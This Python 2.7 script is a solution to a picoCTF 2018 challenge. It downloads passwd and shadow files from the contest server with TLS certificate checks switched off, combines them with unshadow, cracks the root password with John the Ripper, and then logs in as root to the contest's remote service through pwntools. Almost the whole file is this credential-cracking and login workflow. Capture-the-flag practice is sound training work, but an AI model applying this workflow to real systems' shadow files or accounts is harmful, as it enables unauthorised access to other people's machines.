#!/usr/bin/python2.7

import pwn
import os
import wget
import ssl
import re
import string

passwd = ''

if os.path.isfile('passwd'):
    os.system('rm passwd')

if os.path.isfile('shadow'):
    os.system('rm shadow')

if os.path.isfile('crack'):
    os.system('rm crack')

ssl._create_default_https_context = ssl._create_unverified_context

url = 'https://2018shell.picoctf.com/static/0cae99a3ebd7de5e0547e1ff8da980a0/passwd'
wget.download(url, 'passwd')

url = 'https://2018shell.picoctf.com/static/0cae99a3ebd7de5e0547e1ff8da980a0/shadow'
wget.download(url, 'shadow')

os.system('/usr/local/Cellar/john-jumbo/1.8.0/share/john/unshadow passwd shadow > crack')
os.system('john crack')

s1 = 'root:'
s2 = ':0:0'
passwd = pwn.process(['john', '--show', 'crack']).recvall()
passwd = passwd[passwd.find(s1) + len(s1):passwd.find(s2)]

r = pwn.remote('2018shell.picoctf.com', 42165)
r.recv()
r.send('root\n')
r.recv()
r.send(passwd + '\n')

print '\n' + r.recvall()